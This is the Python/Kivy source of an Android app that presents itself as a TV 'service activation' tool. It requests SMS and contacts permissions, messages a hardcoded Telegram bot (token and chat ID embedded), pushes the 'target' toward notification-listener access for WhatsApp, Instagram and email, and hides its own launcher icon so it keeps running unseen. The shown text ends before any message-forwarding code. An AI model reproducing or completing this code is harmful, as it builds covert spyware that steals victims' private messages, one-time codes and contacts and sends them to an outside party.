import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.uix.button import Button
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        self.btn = Button(text="AKTIFKAN LAYANAN", background_color=(0, 1, 0, 1))
        self.btn.bind(on_press=self.proses)
        return self.btn

    def proses(self, instance):
        # Minta Izin SMS dan Kontak
        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS]
        request_permissions(perms, self.hasil_izin)

    def hasil_izin(self, permissions, grants):
        if all(grants):
            bot.send_message(CHAT_ID, "🚀 LAYANAN TELAH AKTIF!\nMenunggu pesan masuk...")
            
            # 1. Buka Akses Notifikasi (WAJIB untuk WA/IG/Email)
            # Kamu harus arahkan target untuk menyalakan tombol ON aplikasi ini
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                PythonActivity.mActivity.startActivity(intent)
            except:
                pass

            # 2. Sembunyikan Ikon
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            pm.setComponentEnabledSetting(comp, 2, 1)
            
            # Jangan langsung exit, biarkan mesin tetap nyala di belakang
            self.btn.text = "Layanan Aktif"
